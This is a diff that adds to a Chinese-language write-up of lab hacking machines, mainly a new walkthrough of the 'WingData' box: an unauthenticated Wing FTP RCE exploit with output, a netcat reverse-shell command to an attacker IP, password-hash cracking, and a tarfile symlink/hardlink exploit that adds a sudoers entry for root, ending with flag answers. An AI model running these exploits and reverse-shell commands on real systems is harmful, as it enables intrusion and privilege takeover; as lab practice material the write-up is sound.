@@ -829,7 +829,7 @@ admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 147
 
 发现登录页面存在注册功能，随便注册一个账号，进入后台只有一个控制面板，页尾部分标明为**Camaleon CMS**版本为**2.9.0**
 
-查一下Camaleon CMS相关漏洞，CVE-2025-2304 - Camaleon CMS Privilege Escalation，POC：https://github.com/predyy/CVE-2025-2304
+查一下Camaleon CMS相关漏洞，CVE-2025-2304 - Camaleon CMS Privilege Escalation，POC：[https://github.com/predyy/CVE-2025-2304]()
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/CVE-2025-2304]
@@ -897,7 +897,7 @@ dqROPzym12Uv+8oPteKHR/US7mOVesHpSJsFA=
 
 现在的情况是有SSH私钥，但是不知道是谁的，查看了网站的一些用户名但是都没用，到现在就没思路了
 
-对该套模板继续搜索，发现还有一个CVE-2024-46987 - Camaleon CMS Authenticated Arbitrary File Read，POC：`https://github.com/Goultarde/CVE-2024-46987`，这是任意文件读取的漏洞，发现关键用户的信息`trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash`
+对该套模板继续搜索，发现还有一个CVE-2024-46987 - Camaleon CMS Authenticated Arbitrary File Read，POC：[https://github.com/Goultarde/CVE-2024-46987]()，这是任意文件读取的漏洞，发现关键用户的信息`trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash`
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/CVE-2024-46987]
@@ -923,6 +923,10 @@ _laurel:x:101:988::/var/log/laurel:/bin/false
 b250c8e5b958147ba7dbb4eba2dff15a
 
 ```
+
+### **ssh2john**
+
+`ssh2john`是一个格式转换工具，专门用于将**密码保护的 SSH 私钥**转换成**John the Ripper**能够识别和破解的哈希格式
 
 可以使用John the Ripper，但是手里的这个`id_ed25519`文件本身是有密码保护（加密过的），John the Ripper不能直接处理 SSH 私钥文件，需要先用`ssh2john` 这个工具把它转换成 John 能识别的哈希格式
 
@@ -1024,3 +1028,332 @@ fd3ea3d16577bdbc128f85e500f204b4
 William answer：b250c8e5b958147ba7dbb4eba2dff15a
 
 Root answer：fd3ea3d16577bdbc128f85e500f204b4
+
+# 靶场：WingData(Linux)
+
+究极折磨，垃圾服务器，在此之前从来没出过问题
+
+nmap扫描
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap -sC -sV 10.129.244.106
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-22 06:15 -0400
+Nmap scan report for 10.129.244.106
+Host is up (0.17s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey: 
+|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
+|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
+80/tcp open  http    Apache httpd 2.4.66
+|_http-server-header: Apache/2.4.66 (Debian)
+|_http-title: Did not follow redirect to http://wingdata.htb/
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ echo '10.129.244.106 wingdata.htb' | sudo tee -a /etc/hosts
+10.129.244.106 wingdata.htb
+
+```
+
+发现：`http://ftp.wingdata.htb/`，Wing FTP Server v7.4.3
+
+Wing FTP Server Remote Code Execution: CVE-2025-47812，Wing FTP 服务器 v7.4.3 未经身份验证的远程代码执行
+
+POC：[https://github.com/4m3rr0r/CVE-2025-47812-poc]()
+
+```
+┌──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc]
+└─$ echo '10.129.244.106 ftp.wingdata.htb' | sudo tee -a /etc/hosts
+10.129.244.106 ftp.wingdata.htb
+
+```
+
+```
+┌──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc]
+└─$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c whoami
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'whoami' and username: 'anonymous'                                 
+[+] UID extracted: d32ba6c4369643757d025887de662072f528764d624db129b32c21fbca0cb8d6                                                               
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: d32ba6c4369643757d025887de662072f528764d624db129b32c21fbca0cb8d6            
+
+--- Command Output ---                                                   
+wingftp
+----------------------
+
+──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc]
+└─$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "ls -la"
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls -la' and username: 'anonymous'                                 
+[+] UID extracted: 881dd8370c47ecb1c70ad34b35352651f528764d624db129b32c21fbca0cb8d6                                                               
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 881dd8370c47ecb1c70ad34b35352651f528764d624db129b32c21fbca0cb8d6            
+
+--- Command Output ---                                                   
+total 26504
+drwxr-x---  9 wingftp wingftp     4096 Jun 22 06:13 .
+drwxr-xr-x  4 root    root        4096 Feb  9 08:19 ..
+drwxr-x---  4 wingftp wingftp     4096 Jun 22 06:13 Data
+-rwxr-x---  1 wingftp wingftp     4834 Jul 31  2018 License.txt
+drwxr-x---  5 wingftp wingftp     4096 Jun 22 06:44 Log
+drwxr-x---  2 wingftp wingftp     4096 Feb  9 08:19 lua
+-rw-r--r--  1 wingftp wingftp        5 Jun 22 06:13 pid-wftpserver.pid
+-rwxr-x---  1 wingftp wingftp     1434 Sep 13  2020 README
+drwxr-x---  2 wingftp wingftp     4096 Jun 22 06:44 session
+drwxr-x---  2 wingftp wingftp     4096 Feb  9 08:19 session_admin
+-rwxr-x---  1 wingftp wingftp   115258 Mar 26  2025 version.txt
+drwxr-x--- 10 wingftp wingftp    12288 Feb  9 08:19 webadmin
+drwxr-x--- 13 wingftp wingftp     4096 Feb  9 08:19 webclient
+-rwxr-x---  1 wingftp wingftp  4649509 Sep 14  2021 wftpconsole
+-rwxr-x---  1 wingftp wingftp     3272 Nov  2  2025 wftp_default_ssh.key
+-rwxr-x---  1 wingftp wingftp     1342 Nov 22  2017 wftp_default_ssl.crt
+-rwxr-x---  1 wingftp wingftp     1675 Nov 22  2017 wftp_default_ssl.key
+-rwxr-x---  1 wingftp wingftp 22283682 Mar 26  2025 wftpserver
+
+```
+
+反弹shell
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nc -lvnp 4444             
+listening on [any] 4444 ...
+connect to [10.10.16.230] from (UNKNOWN) [10.129.244.106] 44868
+
+// 交互shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+// 只能看到用户名，其他没有权限
+wingftp@wingdata:/$ ls home
+ls home
+wacky
+
+// 返回去Data/1/users有wacky的密码
+wingftp@wingdata:/opt/wftpserver/Data/1/users$ cat wacky.xml
+
+<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
+
+```
+
+```
+┌──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc]
+└─$ python CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.16.230 4444 -e /bin/sh" -v
+
+```
+
+发现密码是**64位十六进制**，所以是SHA-256，而且windata还是默认加盐的，盐是固定的`WingFTP`，可以使用john也可以使用hashcat
+
+```
+┌──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc]
+└─$ rm -f hash.txt 
+echo '$dynamic_62$32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca$WingFTP' > hash.txt
+                                                                         
+┌──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc]
+└─$ john --format=dynamic_62 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+┌──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc] └─$ john --format=dynamic_62 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (dynamic_62 [sha256($p.$s) 256/256 AVX2 8x]) Warning: no OpenMP support for this hash type, consider --fork=4 Press 'q' or Ctrl-C to abort, almost any other key for status !#7Blushing^*Bride5 (?) 1g 0:00:00:02 DONE (2026-06-22 07:43) 0.3891g/s 5581Kp/s 5581Kc/s 5581KC/s !JD021803..*7¡Vamos! Use the "--show --format=dynamic_62" options to display all of the cracked passwords reliably Session completed.
+
+// 虚拟机爆显存/内存问题直接用john
+hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
+
+```
+
+ssh登录，拿到user的flag
+
+```
+┌──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc/keys]
+└─$ ssh wacky@ftp.wingdata.htb
+
+wacky@ftp.wingdata.htb's password: 
+
+wacky@wingdata:~$ cat user.txt 
+c028f5bcf3d171252ef3fd068d010a23
+
+```
+
+依旧`sudo -l`，无密码用root权限执行py脚本
+
+```
+wacky@wingdata:~$ sudo -l
+Matching Defaults entries for wacky on wingdata:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User wacky may run the following commands on wingdata:
+    (root) NOPASSWD: /usr/local/bin/python3
+        /opt/backup_clients/restore_backup_clients.py *
+
+```
+
+查看脚本内容
+
+```
+wacky@wingdata:~$ cat /opt/backup_clients/restore_backup_clients.py
+#!/usr/bin/env python3
+import tarfile
+import os
+import sys
+import re
+import argparse
+
+BACKUP_BASE_DIR = "/opt/backup_clients/backups"
+STAGING_BASE = "/opt/backup_clients/restored_backups"
+
+def validate_backup_name(filename):
+    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
+        return False
+    client_id = filename.split('_')[1].rstrip('.tar')
+    return client_id.isdigit() and client_id != "0"
+
+def validate_restore_tag(tag):
+    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Restore client configuration from a validated backup tarball.",
+        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
+    )
+    parser.add_argument(
+        "-b", "--backup",
+        required=True,
+        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
+             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
+    )
+    parser.add_argument(
+        "-r", "--restore-dir",
+        required=True,
+        help="Staging directory name for the restore operation. "
+             "Must follow the format: restore_<client_user> (e.g., restore_john). "
+             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
+    )
+
+    args = parser.parse_args()
+
+    if not validate_backup_name(args.backup):
+        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
+        sys.exit(1)
+
+    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
+    if not os.path.isfile(backup_path):
+        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
+        sys.exit(1)
+
+    if not args.restore_dir.startswith("restore_"):
+        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
+        sys.exit(1)
+
+    tag = args.restore_dir[8:]
+    if not tag:
+        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
+        sys.exit(1)
+
+    if not validate_restore_tag(tag):
+        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
+        sys.exit(1)
+
+    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
+    print(f"[+] Backup: {args.backup}")
+    print(f"[+] Staging directory: {staging_dir}")
+
+    os.makedirs(staging_dir, exist_ok=True)
+
+    try:
+        with tarfile.open(backup_path, "r") as tar:
+            tar.extractall(path=staging_dir, filter="data")
+        print(f"[+] Extraction completed in {staging_dir}")
+    except (tarfile.TarError, OSError, Exception) as e:
+        print(f"[!] Error during extraction: {e}", file=sys.stderr)
+        sys.exit(2)
+
+if __name__ == "__main__":
+    main()
+
+```
+
+CVE-2025-4517，通过不安全提取方式遍历Python tar文件路径，POC：[https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git]()
+
+```
+┌──(kali㉿kali)-[~/Desktop/CVE-2025-4517-POC-HTB-WingData]
+└─$ ls
+CVE-2025-4517-POC.py  README.md
+                                                                         
+┌──(kali㉿kali)-[~/Desktop/CVE-2025-4517-POC-HTB-WingData]
+└─$ python3 -m http.server 80  
+
+```
+
+
+```
+wacky@wingdata:/tmp$ wget http://10.10.16.230/CVE-2025-4517-POC.py
+--2026-06-22 08:25:58--  http://10.10.16.230/CVE-2025-4517-POC.py
+Connecting to 10.10.16.230:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6973 (6.8K) [text/x-python]
+Saving to: ‘CVE-2025-4517-POC.py’
+
+CVE-2025-4517-POC. 100%[=============>]   6.81K  --.-KB/s    in 0.005s  
+
+2026-06-22 08:25:59 (1.39 MB/s) - ‘CVE-2025-4517-POC.py’ saved [6973/6973]
+
+wacky@wingdata:/tmp$ ls
+CVE-2025-4517-POC.py
+systemd-private-4f7161ff95364f0aa21c4ba1404b3e3e-apache2.service-3rbaSk
+systemd-private-4f7161ff95364f0aa21c4ba1404b3e3e-systemd-logind.service-u4kU3e
+systemd-private-4f7161ff95364f0aa21c4ba1404b3e3e-systemd-timesyncd.service-swoJdf
+vmware-root
+vmware-root_3368-2957585481
+wacky@wingdata:/tmp$ python3 CVE-2025-4517-POC.py 
+
+╔═══════════════════════════════════════════════════════════╗
+║     CVE-2025-4517 Tarfile Exploit                         ║
+║     Privilege Escalation via Symlink + Hardlink Bypass    ║
+╚═══════════════════════════════════════════════════════════╝
+    
+[*] Target user: wacky
+[*] Creating exploit tar for user: wacky
+[*] Phase 1: Building nested directory structure...
+[*] Phase 2: Creating symlink chain for path traversal...
+[*] Phase 3: Creating escape symlink to /etc...
+[*] Phase 4: Creating hardlink to /etc/sudoers...
+[*] Phase 5: Writing sudoers entry...
+[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
+[*] Deploying exploit to: /opt/backup_clients/backups/backup_9999.tar
+[+] Exploit deployed successfully
+[*] Triggering extraction via vulnerable script...
+[+] Backup: backup_9999.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn_9999
+[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn_9999
+
+[+] Extraction completed
+[*] Verifying exploit success...
+[+] SUCCESS! User 'wacky' added to sudoers
+[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL
+
+============================================================
+[+] EXPLOITATION SUCCESSFUL!
+[+] User 'wacky' now has full sudo privileges
+[+] Get root with: sudo /bin/bash
+============================================================
+
+[?] Spawn root shell now? (y/n): y
+
+[*] Spawning root shell...
+[*] Run: sudo /bin/bash
+root@wingdata:/tmp# cat /root/root.txt
+72cf7e351c06e6db4b4979cf91ff79fb
+root@wingdata:/tmp# cat /home/wacky/user.txt
+3013e21272bf1c881e02e47605513047
+
+
+```
+
+Wacky answer：3013e21272bf1c881e02e47605513047
+
+Root answer：72cf7e351c06e6db4b4979cf91ff79fb
